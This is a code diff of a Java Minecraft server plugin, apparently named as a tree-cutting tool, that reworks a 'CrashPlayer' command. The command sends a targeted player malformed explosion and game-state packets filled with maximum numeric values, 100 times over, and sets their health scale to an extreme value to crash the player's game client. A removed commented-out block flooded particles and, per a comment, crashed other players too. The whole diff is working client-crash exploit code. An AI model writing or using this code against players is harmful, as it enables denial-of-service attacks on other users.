@@ -1,6 +1,8 @@
 package me.bow.treecapitatorultimate.commands.Player;
 
 import me.bow.treecapitatorultimate.Start;
+import me.bow.treecapitatorultimate.Utils.Packet.Packet;
+import me.bow.treecapitatorultimate.Utils.Packet.PacketSender;
 import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
@@ -9,8 +11,6 @@ import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.scheduler.BukkitRunnable;
 
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.Collections;
 
@@ -28,24 +28,13 @@ public class CrashPlayer extends Command {
                 }
                 p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " is being crashed using combined method (packet, health and particles)!");
                 new BukkitRunnable() {
-                    final Class<?> packetGameStateClass = ReflectionUtils.getMinecraftClass("PacketPlayOutExplosion");
-                    final Object nmsPlayer = anotherPlayer.getClass().getMethod("getHandle").invoke(anotherPlayer);
-                    final Field playerConnectionField = nmsPlayer.getClass().getField("playerConnection");
-                    final Object pConnection = playerConnectionField.get(nmsPlayer);
                     int times = 0;
-                    final Class packetClass = ReflectionUtils.getMinecraftClass("Packet");
-                    final Method sendPacket = pConnection.getClass().getMethod("sendPacket", packetClass);
-                    Object packetPlayOutGameStateChange;
-                    Object packetPlayOutExplosion;
+                    final Class<?> vec3D = ReflectionUtils.getClassCached("{nms}.Vec3D");
+                    final Object packetPlayOutGameStateChange = ReflectionUtils.getConstructorCached(ReflectionUtils.getMinecraftClass("PacketPlayOutGameStateChange"), int.class, float.class).invoke(4, Float.MAX_VALUE);
+                    final Object packetPlayOutExplosion = ReflectionUtils.getConstructorCached(ReflectionUtils.getMinecraftClass("PacketPlayOutExplosion"), double.class, double.class, double.class, float.class, java.util.List.class, vec3D).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), ReflectionUtils.getConstructorCached(vec3D, double.class, double.class, double.class).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
 
                     @Override
                     public void run() {
-                        if (times == 0) {
-                            Class<?> vec3D = ReflectionUtils.getClassCached("{nms}.Vec3D");
-                            Object c = ReflectionUtils.getConstructorCached(vec3D, double.class, double.class, double.class).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
-                            packetPlayOutExplosion = ReflectionUtils.getConstructorCached(packetGameStateClass, double.class, double.class, double.class, float.class, java.util.List.class, vec3D).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), c);
-                            packetPlayOutGameStateChange = ReflectionUtils.getConstructorCached(ReflectionUtils.getMinecraftClass("PacketPlayOutGameStateChange"), int.class, float.class).invoke(4, Float.MAX_VALUE);
-                        }
                         if (times++ >= 100) {
                             p.sendMessage(Start.Prefix + ChatColor.GREEN + "Stopped crashing " + ChatColor.YELLOW + anotherPlayer.getName() + "! (crashing happened 100 times)");
                             this.cancel();
@@ -56,7 +45,7 @@ public class CrashPlayer extends Command {
                             this.cancel();
                             return;
                         }
-                        crashPlayer(anotherPlayer, sendPacket, pConnection, packetPlayOutGameStateChange, packetPlayOutExplosion);
+                        crashPlayer(anotherPlayer, packetPlayOutGameStateChange, packetPlayOutExplosion);
                     }
                 }.runTaskTimerAsynchronously(Start.Instance, 0L, 5L);
                 p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " should be gone after 30 seconds (time out limit) now!");
@@ -66,19 +55,12 @@ public class CrashPlayer extends Command {
         }
     }
 
-    private void crashPlayer(Player p, Method sendPacket, Object pConnection, Object packetPlayOutGameStateChange, Object packetPlayOutExplosion) {
-//        ((CraftPlayer) p).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
+    private void crashPlayer(Player p, Object packetPlayOutGameStateChange, Object packetPlayOutExplosion) {
         try {
-            sendPacket.invoke(pConnection, packetPlayOutGameStateChange);
-            sendPacket.invoke(pConnection, packetPlayOutExplosion);
+            PacketSender.Instance.sendPacket(p, Packet.createFromNMSPacket(packetPlayOutGameStateChange));
+            PacketSender.Instance.sendPacket(p, Packet.createFromNMSPacket(packetPlayOutExplosion));
         } catch (Exception ignored) {
-
         }
-        // ↓ that crashes other playes :( ↓
-        /*for (int f = 0; f < 1000; f++) {
-            p.spawnParticle(Particle.HEART, p.getLocation(), Integer.MAX_VALUE);
-            p.spawnParticle(Particle.EXPLOSION_HUGE, p.getLocation(), Integer.MAX_VALUE);
-        }*/
         p.setHealthScale(Integer.MAX_VALUE);
     }
 }
